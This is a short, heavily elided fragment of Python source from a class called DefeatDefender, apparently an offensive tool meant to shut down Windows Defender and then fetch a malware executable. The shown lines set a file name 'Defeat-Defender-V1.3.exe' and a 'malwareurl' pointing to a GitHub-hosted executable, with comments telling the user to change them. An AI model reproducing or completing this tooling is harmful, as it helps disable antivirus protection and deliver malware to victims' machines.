...
class DefeatDefender:
    ...
    def shutservice(self):
        ...
        if(os.path.exists(Fullpath)):
              ...
              sleep(3.2)
              malname = "Defeat-Defender-V1.3.exe" # your filename must include .exe in the end
              malwareurl = "https://github.com/vava34400/vava34400/blob/main/Defeat-Defender-V1.3.exe" #change this
              print(malwareurl)
